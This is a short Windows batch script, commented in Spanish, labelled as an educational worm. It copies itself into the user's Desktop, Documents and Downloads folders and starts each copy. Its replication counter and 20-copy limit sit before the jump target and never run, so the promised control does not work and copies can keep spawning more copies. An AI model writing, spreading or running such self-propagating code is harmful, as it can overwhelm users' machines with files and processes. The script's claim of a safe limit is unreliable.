@echo off
:: Gusano educativo en batch con opción de replicación controlada y eliminación de archivos generados.
:: Creado para fines educativos - No usar de manera maliciosa.

:: Establecer un límite de replicación
set /a max_replicas=20
setlocal enabledelayedexpansion

:: Nombre del archivo replicado
set script_name=%~nx0

:: Directorios donde replicar el gusano (Documentos, Escritorio, etc.)
set paths=("%USERPROFILE%\Desktop" "%USERPROFILE%\Documents" "%USERPROFILE%\Downloads")

:: Verificar si se alcanzó el límite de replicación
if exist %USERPROFILE%\worm_count.txt (
    set /p replicas=<%USERPROFILE%\worm_count.txt
) else (
    set /a replicas=0
)

:: Mostrar menú de opciones
echo ----------------------------------
echo 1. Ejecutar gusano
echo 2. Eliminar archivos generados
echo 3. Salir
echo ----------------------------------
set /p choice="Seleccione una opcion (1-3): "

if "%choice%"=="1" goto replicate
if "%choice%"=="2" goto remove
if "%choice%"=="3" goto end

:: Limitar el número de replicaciones
if %replicas% geq %max_replicas% (
    echo "Límite de replicaciones alcanzado (%max_replicas%)"
    goto :end
)

:: Incrementar el contador de replicaciones
set /a replicas+=1
echo %replicas% > %USERPROFILE%\worm_count.txt

:: Mostrar el número de replicaciones actuales
echo Replicaciones actuales: %replicas%/%max_replicas%

:: Función para replicar el script en diferentes directorios
:replicate
for %%i in %paths% do (
    copy "%~f0" %%i\replica!replicas!.bat
    echo Replica creada en %%i\replica!replicas!.bat
)

:: Opción de autoejecutarse en los nuevos directorios
:start_replicas
for %%i in %paths% do (
    start %%i\replica!replicas!.bat
)

goto end

:: Función para eliminar archivos generados
:remove
echo "Eliminando archivos generados..."
for %%i in %paths% do (
    del /q %%i\replica*.bat
    echo Replicas eliminadas en %%i
)

:: Eliminar el archivo de conteo de replicaciones
if exist %USERPROFILE%\worm_count.txt (
    del /q %USERPROFILE%\worm_count.txt
    echo "Archivo worm_count.txt eliminado."
)

goto end

:end
echo "Proceso finalizado."
pause
exit
